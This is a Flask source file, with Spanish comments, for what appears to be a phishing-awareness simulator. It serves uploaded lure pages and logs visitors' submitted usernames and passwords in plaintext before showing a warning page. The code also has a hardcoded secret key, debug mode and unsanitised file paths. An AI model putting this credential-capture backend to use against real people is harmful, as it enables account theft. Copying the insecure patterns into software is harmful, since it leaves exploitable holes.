from flask import Flask, render_template, request, redirect, url_for, session
import os
from datetime import datetime
from werkzeug.security import generate_password_hash, check_password_hash

app = Flask(__name__)
app.secret_key = 'super-secret-key'  # Reemplazar por algo más seguro en producción

UPLOAD_FOLDER = 'campaigns'
LOG_FOLDER = 'logs'
TEMPLATE_FOLDER = 'templates/campaign_templates'
CREDENTIAL_FILE = 'admin_credentials.txt'

os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(LOG_FOLDER, exist_ok=True)
os.makedirs(TEMPLATE_FOLDER, exist_ok=True)

# --- Funciones de autenticación ---
def user_exists():
    return os.path.exists(CREDENTIAL_FILE)

def save_credentials(username, password):
    with open(CREDENTIAL_FILE, 'w') as f:
        f.write(f"{username},{generate_password_hash(password)}")

def check_credentials(username, password):
    if not user_exists():
        return False
    with open(CREDENTIAL_FILE, 'r') as f:
        stored_user, stored_hash = f.read().strip().split(',')
    return username == stored_user and check_password_hash(stored_hash, password)

# --- Rutas públicas ---
@app.route('/')
def landing():
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if not user_exists():
        return redirect(url_for('setup'))
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        if check_credentials(username, password):
            session['user'] = username
            return redirect(url_for('dashboard'))
        else:
            return render_template('login.html', error="Credenciales inválidas")
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

@app.route('/setup', methods=['GET', 'POST'])
def setup():
    if user_exists():
        return redirect(url_for('login'))
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        save_credentials(username, password)
        return redirect(url_for('login'))
    return render_template('setup.html')

# --- Dashboard y campañas (requiere login) ---
def login_required(view_func):
    def wrapped_view(*args, **kwargs):
        if 'user' not in session:
            return redirect(url_for('login'))
        return view_func(*args, **kwargs)
    wrapped_view.__name__ = view_func.__name__
    return wrapped_view

@app.route('/dashboard')
@login_required
def dashboard():
    templates = os.listdir(TEMPLATE_FOLDER)
    campaigns = [f[:-5] for f in os.listdir(UPLOAD_FOLDER) if f.endswith('.html')]
    return render_template('index.html', templates=templates, campaigns=campaigns)

@app.route('/create_campaign', methods=['POST'])
@login_required
def create_campaign():
    campaign_name = request.form['campaign_name']
    selected_template = request.form.get('selected_template')
    html_file = request.files.get('html_file')

    save_path = os.path.join(UPLOAD_FOLDER, f"{campaign_name}.html")

    if html_file:
        html_file.save(save_path)
    elif selected_template:
        template_path = os.path.join(TEMPLATE_FOLDER, selected_template)
        if os.path.exists(template_path):
            with open(template_path, 'r', encoding='utf-8') as src, open(save_path, 'w', encoding='utf-8') as dst:
                dst.write(src.read())
        else:
            return "Plantilla no encontrada", 400
    else:
        return "Debe seleccionar o subir una plantilla", 400

    return render_template("campaign_created.html", campaign_name=campaign_name)

@app.route('/campana/<campaign_name>', methods=['GET', 'POST'])
def run_campaign(campaign_name):
    campaign_path = os.path.join(UPLOAD_FOLDER, f"{campaign_name}.html")
    log_path = os.path.join(LOG_FOLDER, f"{campaign_name}_log.txt")

    if not os.path.exists(campaign_path):
        return "Campaña no encontrada", 404

    if request.method == 'POST':
        email = request.form.get('username', 'N/A')
        password = request.form.get('password', 'N/A')
        timestamp = datetime.now().isoformat()
        with open(log_path, 'a') as f:
            f.write(f"{email},{password},{timestamp}\n")
        return redirect(url_for('warning'))

    with open(campaign_path, 'r', encoding='utf-8') as f:
        html = f.read()
    return html

@app.route('/warning')
def warning():
    return render_template('warning.html')

@app.route('/logs/<campaign_name>')
@login_required
def view_logs(campaign_name):
    log_path = os.path.join(LOG_FOLDER, f"{campaign_name}_log.txt")
    if not os.path.exists(log_path):
        return "Sin registros para esta campaña."
    with open(log_path) as f:
        logs = f.readlines()
    return render_template("logs.html", logs=logs)

if __name__ == '__main__':
    app.run(debug=True)